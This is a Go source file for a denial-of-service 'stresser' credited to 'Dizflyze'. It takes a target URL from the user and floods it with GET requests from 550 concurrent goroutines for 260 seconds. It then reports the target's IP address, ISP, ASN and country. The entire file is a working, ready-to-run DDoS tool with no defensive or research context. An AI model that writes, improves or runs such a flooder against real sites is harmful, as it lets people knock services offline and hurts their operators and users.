package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    startTime   = time.Now()
    requests    int64
    concurrency = 550
)

const (
    colorReset  = "\033[0m"
    colorRed    = "\033[31m"
    colorGreen  = "\033[32m"
    colorYellow = "\033[33m"
    colorBlue   = "\033[34m"
    colorCyan   = "\033[36m"
)

func printLogo() {
    fmt.Println(colorReset + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Author : Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] Denial Of Service
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Version : v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Update : 23 January
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
` + colorReset)
}

func getIpDetails(ip string) (isp, asn, country string) {
    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Get("http://ip-api.com/json/" + ip)
    if err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    defer resp.Body.Close()

    type ipApiResponse struct {
        Country string `json:"country"`
        Org     string `json:"org"`
        AS      string `json:"as"`
    }

    var data ipApiResponse
    if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    return data.Org, data.AS, data.Country
}

// Fungsi untuk mendapatkan IP dari host target
func getHostIP(host string) string {
    ips, err := net.LookupIP(host)
    if err != nil || len(ips) == 0 {
        return "Unknown"
    }
    return ips[0].String()
}

func attack(url string, duration time.Duration, wg *sync.WaitGroup, stopChan chan struct{}) {
    defer wg.Done()
    client := &http.Client{Timeout: 2 * time.Second}
    endTime := time.Now().Add(duration)
    for {
        select {
        case <-stopChan:
            return
        default:
            req, err := http.NewRequest("GET", url, nil)
            if err != nil {
                continue
            }
            _, err = client.Do(req)
            if err == nil {
                atomic.AddInt64(&requests, 1)
            }
            if time.Now().After(endTime) {
                return
            }
        }
    }
}

func main() {
    printLogo()
    reader := bufio.NewReader(os.Stdin)
    fmt.Print(colorReset + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + colorReset)
    url, _ := reader.ReadString('\n')
    url = strings.TrimSpace(url)

    durasi := 260 * time.Second
    var wg sync.WaitGroup
    stopChan := make(chan struct{})

    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go attack(url, durasi, &wg, stopChan)
    }

    time.Sleep(durasi)
    close(stopChan)
    wg.Wait()

    elapsed := time.Since(startTime)

    // Extract host dari URL
    host := getHost(url)
    hostIP := getHostIP(host)

    ispHost, asnHost, countryHost := getIpDetails(hostIP)

    printLogo()
    fmt.Println(colorRed + "╔═════════════════════════════════════════════════════╗" + colorReset)
    fmt.Printf("%s│%s Link            : %s%s\n", colorRed, colorReset, colorYellow, url)
    fmt.Printf("%s│%s Host            : %s%s\n", colorRed, colorReset, colorYellow, host)
    fmt.Printf("%s│%s Host IP         : %s%s\n", colorRed, colorReset, colorYellow, hostIP)
    fmt.Printf("%s│%s ISP             : %s%s\n", colorRed, colorReset, colorCyan, ispHost)
    fmt.Printf("%s│%s ASN             : %s%s\n", colorRed, colorReset, colorCyan, asnHost)
    fmt.Printf("%s│%s Country         : %s%s\n", colorRed, colorReset, colorCyan, countryHost)
    fmt.Printf("%s│%s Duration        : %s\n", colorRed, colorReset, elapsed)
    fmt.Printf("%s│%s Total Requests  : %s%d\n", colorRed, colorReset, colorYellow, requests)
    fmt.Println(colorRed + "╚═════════════════════════════════════════════════════╝" + colorReset)
}

func getHost(url string) string {
    parts := strings.Split(url, "/")
    if len(parts) >= 3 {
        return parts[2]
    }
    return url
}
